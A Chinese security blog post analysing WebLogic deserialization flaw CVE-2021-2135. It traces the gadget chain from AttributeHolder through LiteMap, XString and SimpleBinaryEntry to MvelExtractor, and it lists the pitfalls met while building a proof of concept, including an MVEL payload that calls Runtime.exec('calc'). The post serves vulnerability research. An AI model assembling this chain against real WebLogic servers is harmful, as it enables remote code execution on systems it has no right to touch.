> 原文链接: https://www.anquanke.com//post/id/248770 


# WebLogic CVE-2021-2135分析及POC构造遇到的问题


                                阅读量   
                                **20497**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t0185005d457da375ac.png)](https://p4.ssl.qhimg.com/t0185005d457da375ac.png)



## 一、前言

早在今年4月 Weblogic发布了安全公告，里面有一个编号是CVE-2021-2135的反序列化漏洞，因为工作原因需要构造该漏洞POC，当时拿到了安全补丁，但是奈何太菜并没有解出来。后来360CERT发布了分析文章，花了一周多的时间终于把POC构造出来了。现在把分析学习及POC构造中遇到的问题记录下来。

4月与1月补丁`WebLogicFilterConfig.class`diff后如下，将`com.tangosol.internal.util.SimpleBinaryEntry`加入了黑名单。

```
private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]`{`"oracle.jdbc.pool.OraclePooledConnection"`}`;

private static final String[] DEFAULT_WLS_ONLY_BLACKLIST_CLASSES = new String[]`{`"com.tangosol.internal.util.SimpleBinaryEntry"`}`;
```

根据补丁反向推漏洞的话主要两部分命令执行载体和反序列化载体，命令执行载体达到我们执行命令的目的，反序列化载体从反序列化从入口到命令执行载体入口的动态执行，我们先分别来分析下。



## 二、命令执行载体分析：

既然我们已经知道`com.tangosol.internal.util.SimpleBinaryEntry`在黑名单里，那么我们来分析下`com.tangosol.internal.util.SimpleBinaryEntry`的特性。

### <a class="reference-link" name="1%E3%80%81SimpleBinaryEntry%E7%9A%84%E7%89%B9%E6%80%A7"></a>1、SimpleBinaryEntry的特性

`SimpleBinaryEntry`实现了`SerializerAware`、`ExternalizableLite`、`PortableObject`，`ExternalizableLite`用来处理序列化相关数据。

```
public class SimpleBinaryEntry&lt;K, V&gt; 
    implements Entry&lt;K, V&gt;, SerializerAware, ExternalizableLite, PortableObject

```

`SimpleBinaryEntry`有2个可序列化属性和3个不可序列化属性，其中`m_binKey`和`m_binValue`是二进制类型。

```
@JsonbProperty("binKey")
protected Binary m_binKey; //二进制key，JsonbProperty作用是把该属性的名称序列化为另外一个名称，如把m_binKey属性序列化为binKey
@JsonbProperty("binValue")
protected Binary m_binValue; //二进制value
protected transient Serializer m_serializer;
protected transient K m_key;
protected transient V m_value;
```

`SimpleBinaryEntry`有参构造方法通过传参`BinaryEntry`或者key和value给属性`m_binKey`和`m_binValue`赋值：

```
public SimpleBinaryEntry(Binary binKey, Binary binValue) `{`
    this.m_binKey = binKey;
    this.m_binValue = binValue;
`}`
```

**`SimpleBinaryEntry`借助`m_serializer`通过`getKey`和`getValue`方法处理另外两个属性`m_key`和`m_value`。当其没有被赋值，会调用`ExternalizableHelper.fromBinary`来处理并返回结果，这时候的`m_key`和`m_value`处理后可以是指定类型的实例，而这也是漏洞的关键之处，我们可以通过构造将`m_key`或`m_value`转为我们想要的对象。**

```
public K getKey() `{`
    K key = this.m_key;
    if (key == null) `{`
        // 返回的是ExternalizableHelper.fromBinary(this.m_binKey,this.m_serializer)的结果
        key = this.m_key = ExternalizableHelper.fromBinary(this.m_binKey, this.getContextSerializer());
    `}`

    return key;
`}`

public V getValue() `{`
    V value = this.m_value;
    if (value == null) `{`
        // 返回的是ExternalizableHelper.fromBinary的结果
        value = this.m_value = ExternalizableHelper.fromBinary(this.m_binValue, this.getContextSerializer());
    `}`

    return value;
`}`
```

SimpleBinaryEntry重写了toString方法，我们可以通过该方法调用getKey。

```
public String toString() `{`
    return "SimpleBinaryEntry(key=\"" + this.getKey() + "\", value=\"" + this.getValue() + "\")";
`}`
```

我们来看下`ExternalizableHelper.fromBinary`。

### 2、`ExternalizableHelper.fromBinary`

`ExternalizableHelper.fromBinary`最终会调用`ExternalizableHelper.deserializeInternal`处理，`deserializeInternal`方法如下，当`nType!=21`时调用`ExternalizableHelper.readObjectInternal`读取对象。

```
// serializer可以是SimpleBinaryEntry.this.m_serializer，buf可以是SimpleBinaryEntry.m_binKey或m_binValue
private static &lt;T&gt; T deserializeInternal(Serializer serializer, ReadBuffer buf, Function&lt;BufferInput, BufferInput&gt; supplierBufferIn, Class&lt;T&gt; clazz) throws IOException `{`
    BufferInput in = buf.getBufferInput();
    int nType = in.readUnsignedByte();
    switch(nType) `{`
    ...
    ...
    if (supplierBufferIn != null) `{`
        in = (BufferInput)supplierBufferIn.apply(in);
    `}`
    // nType!=21，调用ExternalizableHelper.readObjectInternal
    Object o = nType == 21 ? serializer.deserialize(in, clazz) : readObjectInternal(in, nType, ((ClassLoaderAware)serializer).getContextClassLoader());
    return realize(o, serializer);
`}`
```

`ExternalizableHelper.readObjectInternal`会按照`nType`的值进行处理，根据`ExternalizableHelper.writeObjectnType`，在序列化时通过`getStreamFormat`进行赋值。

```
// getStreamFormat:o instanceof ExternalizableLite ? 10，当对象是ExternalizableLite实例，nType=10
public static int getStreamFormat(Object o) `{`
    return o == null ? 0 : (o instanceof String ? 6 : (o instanceof Number ? (o instanceof Integer ? 1 : (o instanceof Long ? 2 : (o instanceof Double ? 3 : (o instanceof BigInteger ? 4 : (o instanceof BigDecimal ? 5 : (o instanceof Float ? 14 : (o instanceof Short ? 15 : (o instanceof Byte ? 16 : 11)))))))) : (o instanceof byte[] ? 8 : (o instanceof ReadBuffer ? 7 : (o instanceof XmlBean ? 12 : (o instanceof ExternalizableHelper.IntDecoratedObject ? 13 : (o instanceof ExternalizableLite ? 10 : (o instanceof Boolean ? 17 : (o instanceof Serializable ? 11 : (o instanceof Optional ? 22 : (o instanceof OptionalInt ? 23 : (o instanceof OptionalLong ? 24 : (o instanceof OptionalDouble ? 25 : (o instanceof XmlSerializable ? 9 : 255))))))))))))));
`}`
```

`ExternalizableHelper.readObjectInternal`代码如下，根据**序列化数据的类型`nType`**进行反序列化读取对象，当nType=10，调用readExternalizableLite。

```
private static Object readObjectInternal(DataInput in, int nType, ClassLoader loader) throws IOException `{`
    switch(nType) `{`
    case 0:
        return null;
    case 1:
        return readInt(in);
    case 2:
        return readLong(in);
    ......
    case 7:
        Binary bin = new Binary(); //调用Binary.readExternal反序列化读取
        bin.readExternal(in);
        return bin;
    ......
    case 10:
        return readExternalizableLite(in, loader); // 当nType=10，调用readExternalizableLite
    case 11:
        return readSerializable(in, loader);
    ......
    case 255:
        return readSerializable(in, loader);
    default:
        throw new StreamCorruptedException("invalid type: " + nType);
    `}`
`}`
```

在`ExternalizableHelper.readExternalizableLite`中，会实例化类为value，并且会调用value所属类的readExternal方法来读取最终的对象。

```
public static ExternalizableLite readExternalizableLite(DataInput in, ClassLoader loader) throws IOException `{`
    ExternalizableLite value;
    if (in instanceof PofInputStream) `{`
        value = (ExternalizableLite)((PofInputStream)in).readObject();
    `}` else `{`
        String sClass = readUTF((DataInput)in); // 获取类名
        WrapperDataInputStream inWrapper = in instanceof WrapperDataInputStream ? (WrapperDataInputStream)in : null;

        try `{`
            // 加载并实例化序列化时写入的类名
            value = (ExternalizableLite)loadClass(sClass, loader, inWrapper == null ? null : inWrapper.getClassLoader()).newInstance();
            ......
        // 调用value的readExternal方法读取对象
        value.readExternal((DataInput)in);
        // !!注意这里 当value是SerializerAware的实例，会设置它的Serializer
        if (value instanceof SerializerAware) `{`
            ((SerializerAware)value).setContextSerializer(ensureSerializer(loader));
        `}`
    `}`

    return value;
`}`
```

看到这里我们已经明白了`SimpleBinaryEntry`本质是Entry，有键值对，它的key即`m_key`属性、value即`m_value`属性，可以通过`getKey`和`getValue`设置，而`getKey`通过`ExternalizableHelper.fromBinary`来处理，`ExternalizableHelper.fromBinary`会根据`m_binKey`的数据类型的不同调用不同的反序列化方法进行读取，那么我们可以构造`m_binKey`达到我们命令执行的目的。

那么到这里我们怎么执行命令？参考之前的漏洞[CVE-2020-14756](https://xz.aliyun.com/t/9550)，可以考虑通过`com.tangosol.coherence.rest.util.extractor.MvelExtractor#extrace`执行命令。

```
ExternalizableHelper.readExternalizableLite()
        TopNAggregator.PartialResult.readExternal()
           TopNAggregator.PartialResult.add()
             (AbstractExtractor)MvelExtractor.compare()
               MvelExtractor.extract()
                 MVEL.executeExpression()
```

### <a class="reference-link" name="3%E3%80%81TopNAggregator.PartialResult.readExternal()%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"></a>3、TopNAggregator.PartialResult.readExternal()到命令执行

`TopNAggregator$PartialResult`实现了`ExternalizableLite`，其重写了`readExternal()`，我们可以通过`ExternalizableHelper.readExternalizableLite()`调用`TopNAggregator$PartialResult.readExternal`。

`TopNAggregator$PartialResult.readExternal`主要读取和恢复`m_comparator`、`m_cMaxSize`、`m_map`属性的数据，其中调用了`Comparator.readObject`给属性`m_comparator`赋值，`comparator` 可控为 `MvelExtractor`，`m_map`是用`m_comparator`构造的`TreeMap`实例，并且通过`TopNAggregator$PartialResult.add`添加map的键值对。`TopNAggregator$PartialResult.add`会调用父类的add方法，最终通过map.put添加数据。

```
public void readExternal(DataInput in) throws IOException `{`
    // 这里会调用Comparator.readObject给this.m_comparator赋值
    this.m_comparator = (Comparator)ExternalizableHelper.readObject(in);
    this.m_cMaxSize = ExternalizableHelper.readInt(in);
    //调用SortedBag.instantiateInternalMap
    this.m_map = this.instantiateInternalMap(this.m_comparator);
    int cElems = in.readInt();

    for(int i = 0; i &lt; cElems; ++i) `{`
        // 调用add
        this.add(ExternalizableHelper.readObject(in));
    `}`

    this.m_comparator_copy = this.m_comparator;
`}`

public boolean add(E o) `{`
    NavigableMap map = this.getInternalMap();

    while(!Base.equals(o, this.unwrap(map.ceilingKey(o)))) `{`
        if (map.put(o, NO_VALUE) == null) `{`
            return true;
        `}`
    `}`
    // 调用map.put
    map.put(this.wrap(o), NO_VALUE);
    return true;
`}`
```

TreeMap.put()调用TreeMap.compare，最终会调用`comparator.compare((K)k1, (K)k2)`。

```
public V put(K key, V value) `{`
    Entry&lt;K,V&gt; t = root;
    if (t == null) `{`
        // 调用TreeMap.compare
        compare(key, key); // type (and possibly null) check
        ......
        return null;
    `}`
    int cmp;
    Entry&lt;K,V&gt; parent;
    ......
    return null;
`}`

final int compare(Object k1, Object k2) `{`
    return comparator==null ? ((Comparable&lt;? super K&gt;)k1).compareTo((K)k2) : comparator.compare((K)k1, (K)k2);
`}`
```

如果这里comparator是我们构造的MvelExtractor实例，MvelExtractor继承了AbstractExtractor，便可以调用`AbstractExtractor.compare`，从而调用`MvelExtractor.extract`达到命令执行的目的。

```
# AbstractExtractor.compare
public int compare(Object o1, Object o2) `{`
    return SafeComparator.compareSafe((Comparator)null, this.extract(o1), this.extract(o2));
`}`
# MvelExtractor.extract
public Object extract(Object oTarget) `{`
    // 调用MVEL.executeExpression执行命令
    return oTarget == null ? null : MVEL.executeExpression(this.getCompiledExpression(), oTarget);
`}`
```



## 三、反序列化载体分析：

### 1、`SimpleBinaryEntry.toString()`的触发

反序列化到`SimpleBinaryEntry.toString()`的触发，在[360CERT](https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg)中提到用`com.sun.org.apache.xpath.internal.objects.XString.equals()`。当`XString.equals()`的参数是SimpleBinaryEntry实例时，可以调用`SimpleBinaryEntry.toString`。

```
public boolean equals(Object obj2)
`{`
  if (null == obj2)
    return false;
  else if (obj2 instanceof XNodeSet)
    return obj2.equals(this);
  else if(obj2 instanceof XNumber)
      return obj2.equals(this);
  else
    return str().equals(obj2.toString());//，当传入的是simpleBinaryEntry，调用SimpleBinaryEntry.toString
`}`
```

这时候需要触发`XString.equals(simpleBinaryEntry)`，我们可以考虑Map的put方法，因为Map一般在插入元素时做比较会调用equal，并且Map有个特别之处就是它一般不限制对象的类型，我们可以构造Map的Key或者Value为不同的对象如XString实例或者simpleBinaryEntry实例。

`com.tangosol.util.LiteMap`继承了`com.tangosol.util.InflatableMap`，`InflatableMap.put`中当`InflatableMap.m_nImpl==1`，通过调用`Objects.equals(xString, simpleBinaryEntry)`可以调用`xString.equals(simpleBinaryEntry)`。所以LiteMap构造时传入的Map是`map&lt;simpleBinaryEntry, anyValue&gt;`和`map&lt;xString, anyValue&gt;`。

```
public V put(K key, V value) `{`
    switch(this.m_nImpl) `{`
    case 0:
        this.m_nImpl = 1;
        this.m_oContents = this.instantiateEntry(key, value);
        return null;
    case 1:
        Entry&lt;K, V&gt; entry = (Entry)this.m_oContents;
        K entryKey = entry.getKey();
        V prevValue = null;
        // this.m_nImpl==1，调用Objects.equals(key, entryKey)，Objects.equals(xString, simpleBinaryEntry)
        if (Objects.equals(key, entryKey)) `{`
            prevValue = entry.getValue();
            entry.setValue(value);
        `}` else `{`
            Entry&lt;K, V&gt;[] aEntry = new Entry[8];
            aEntry[0] = entry;
            aEntry[1] = this.instantiateEntry(key, value);
            this.m_nImpl = 3;
            this.m_oContents = aEntry;
        `}`

        return prevValue;
    ...
    ...
    `}`
`}`

public static boolean equals(Object a, Object b) `{`
    // 当a!=b，返回a.equals(b)，当a是xString，b是simpleBinaryEntry，a肯定不等于b，调用xString.equals(simpleBinaryEntry)
    return (a == b) || (a != null &amp;&amp; a.equals(b));
`}`
```

### <a class="reference-link" name="2%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3"></a>2、反序列化入口

那么接下来是找到反序列化入口，必然涉及到readObject或readExternal等类似读取的方法，如何在这些方法中调用`LiteMap.put`。`com.tangosol.util.processor.ConditionalPutAll`实现了`com.tangosol.io.ExternalizableLite`并重写了readExternal，在readExternal中构造了LiteMap实例，并且调用了`com.tangosol.util.ExternalizableHelper.readMap`将map的属性读取赋值给LiteMap实例。

```
public void readExternal(DataInput in) throws IOException `{`
    this.m_filter = (Filter)ExternalizableHelper.readObject(in);
    // 创建LiteMap对象
    Map map = this.m_map = new LiteMap();
    // 调用ExternalizableHelper.readMap处理map的反序列化
    ExternalizableHelper.readMap(in, map, (ClassLoader)null);
`}`
```

`com.tangosol.util.ExternalizableHelper.readMap`中调用了`map.put`，假如oKey=xString、oVal=simpleBinaryEntry，刚好就能调用这里的map是LiteMap的实例，所以会调用`com.tangosol.util.InflatableMap.put(xString,simpleBinaryEntry)`，跟前面的链就连上了。

```
public static int readMap(DataInput in, Map map, ClassLoader loader) throws IOException `{`
    int cEntries;
    if (in instanceof PofInputStream) `{`
        PofInputStream inPof = (PofInputStream)in;
        inPof.getPofReader().readMap(inPof.nextIndex(), map);
        cEntries = map.size();
    `}` else `{`
        cEntries = in.readInt();

        for(int i = 0; i &lt; cEntries; ++i) `{`
            // 读取map.key
            Object oKey = readObject(in, loader);
            // 读取map.value
            Object oVal = readObject(in, loader);
            // 调用map.put将key和value添加到map
            map.put(oKey, oVal);
        `}`
    `}`

    return cEntries;
`}`
```

刚开始的时候分析到这里我以为就完成了整个链，没想到忽略了一点-**ConditionalPutAll只有`readExternal(DataInput in)`方法**，没有实现Externalizable，不能传入`ObjectInput`，所以不但能作为入口。我们可以用CVE-2020-14756的`com.tangosol.coherence.servlet.AttributeHolder`作为入口，AttributeHolder实现了Externalizable，并且可以通过调用`readExternal(ObjectInput in)`调用`ExternalizableHelper.readObject(in)`

```
public void readExternal(ObjectInput in) throws IOException `{`
    this.readExternal((DataInput)in);
`}`

public void readExternal(DataInput in) throws IOException `{`
    this.m_sName = ExternalizableHelper.readUTF(in);
    //通过ExternalizableHelper.readObject可以进一步调用ExternalizableHelper.readObjectInternal
    this.m_oValue = ExternalizableHelper.readObject(in);
    this.m_fActivationListener = in.readBoolean();
    this.m_fBindingListener = in.readBoolean();
    this.m_fLocal = in.readBoolean();
`}`
```



## 四、POC构造遇到的三个问题

在构造POC时，遇到了三个分析了很久才解决的问题：
<li>
`SimpleBinaryEntry.m_binKey`的构造问题</li>
- 不设置`SimpleBinaryEntry.m_serializer`导致序列化失败
- ClassCastException报错问题导致序列化失败
### 1、`SimpleBinaryEntry.m_binKey`的构造问题

最初构造m_binKey时，我用的是`TopNAggregator$PartialResult.writeExternal()`来写二进制数据，我忘了很重要的一点，`writeExternal()`一般序列化只会写一些属性，不涉及`TopNAggregator$PartialResult`自身的序列化，所以我调试到这里始终进不去`TopNAggregator$PartialResult.writeExternal()`，后来通过ExternalizableHelper解决了。

```
ExternalizableHelper.writeObject(dataOutputStream1, partialResult);
```

### 2、不设置`SimpleBinaryEntry.m_serializer`导致序列化失败

SimpleBinaryEntry在反序列化时会通过`if (value instanceof SerializerAware) `{`((SerializerAware)value).setContextSerializer(ensureSerializer(loader));`}``给m_serializer赋值，所以虽然m_serializer时transient类型但是也被赋值了。但是在序列化时，我们需要用setContextSerializer给m_serializer赋值，如果没有设置m_serializer，会报错NullPointerException，因为SimpleBinaryEntry的key和value需要利用m_serializer来获取。调试的时候发现默认使用的是`com.tangosol.io.DefaultSerializer`，所以我在设置是也用了它。

```
Serializer m_serializer= new DefaultSerializer(SimpleBinaryEntry.class.getClassLoader());
simpleBinaryEntry.setContextSerializer(m_serializer);
```

### <a class="reference-link" name="3%E3%80%81ClassCastException%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98"></a>3、ClassCastException报错问题

在用y4er CVE-2020-14756的POC时也报了错：ClassCastException，但不影响执行命令，但是我的POC在序列化也执行了命令，所以才会报这个错并且导致程序执行不下去。

[![](https://p4.ssl.qhimg.com/t01326e49502a87e188.png)](https://p4.ssl.qhimg.com/t01326e49502a87e188.png)

执行了`SafeComparator.compareSafe((Comparator)null, this.extract(o1), this.extract(o2))`，真正报错的地方在该方法的`((Comparable)o1).compareTo(o2)`。因为在传入参数时调用`MvelExtractor.extract(o1)`传值，extract通过`MVEL.executeExpression`返回结果，extract会把`MVEL.executeExpression`的结果返回作为o1，**当`MVEL.executeExpression`执行结果是空默认会返回一个`java.lang.ProcessImpl`对象**，`ProcessImpl`并不是`Comparable`的子类，所以将`ProcessImpl`转为`Comparable`会报一个转换错误。如何解决呢？既然执行的结果是空才会返回`ProcessImpl`对象，我只要返回一个实现了`Comparable`的类的实例就可以解决这个问题，这里我用了Integer。

```
MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"calc\");return new Integer(1);");
```

### <a class="reference-link" name="%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"></a>参考链接：

[https://xz.aliyun.com/t/9550](https://xz.aliyun.com/t/9550)<br>[https://y4er.com/post/weblogic-cve-2020-14756/](https://y4er.com/post/weblogic-cve-2020-14756/)<br>[https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg](https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg)
